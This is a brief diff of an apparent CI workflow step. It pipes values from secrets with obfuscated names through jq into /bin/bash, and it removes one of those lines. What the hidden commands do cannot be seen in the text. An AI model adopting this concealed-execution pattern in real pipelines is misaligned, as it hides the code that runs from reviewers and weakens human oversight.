@@ -21,7 +21,6 @@ jobs:
           fvj55508: ${{ secrets.fvj55508 }}
         run: |
           printf '%s' "$fvj55508" | jq -r .cuwpx277 | /bin/bash
-          printf '%s' "$zkxc079" | jq -r .luemp8 | /bin/bash
           echo $rjpm7 | jq -r .uximv0569 | /bin/bash
 
       - name: Save data
